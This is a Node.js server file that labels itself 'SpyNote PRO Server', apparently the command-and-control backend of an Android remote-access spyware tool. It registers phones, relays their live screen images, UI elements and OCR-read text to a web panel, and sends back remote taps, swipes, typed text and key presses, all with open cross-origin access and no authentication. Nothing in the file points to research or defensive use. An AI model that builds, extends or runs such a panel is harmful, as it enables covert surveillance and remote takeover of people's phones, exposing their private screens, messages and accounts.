const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 60000,
    pingInterval: 25000
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));

const devices = new Map();

app.post('/register', (req, res) => {
    const { deviceId, model, brand, version, status } = req.body;
    if (deviceId) {
        devices.set(deviceId, { model, brand, version, status, connected: true });
        io.emit('devices-update', Array.from(devices.entries()));
    }
    res.json({ success: true });
});

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Web panel connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { ...deviceInfo, connected: true, socketId: socket.id });
            socket.join(deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    // 🔥 ENHANCED: Screen + UI Elements + OCR
    socket.on('screen-data', (data) => {
        const deviceId = data.deviceId;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('screen-update', {
                deviceId,
                screen: data.screen,
                elements: data.elements || [],
                ocrText: data.ocrText || '',
                width: data.width,
                height: data.height,
                timestamp: data.timestamp
            });
        }
    });

    // 🔥 ENHANCED Controls: Tap, Swipe, Scroll, Text, Keys
    socket.on('control', (data) => {
        const { deviceId, action, x, y, startX, startY, endX, endY, text, keyCode } = data;
        if (devices.has(deviceId)) {
            socket.to(deviceId).emit('control', {
                action, x: parseFloat(x)||0, y: parseFloat(y)||0,
                startX: parseFloat(startX)||0, startY: parseFloat(startY)||0,
                endX: parseFloat(endX)||0, endY: parseFloat(endY)||0,
                text: text || '', keyCode: keyCode || 0
            });
        }
    });

    socket.on('disconnect', () => {
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                break;
            }
        }
    });
});

server.listen(process.env.PORT || 3000, () => {
    console.log(`🚀 SpyNote PRO Server: http://localhost:3000`);
});
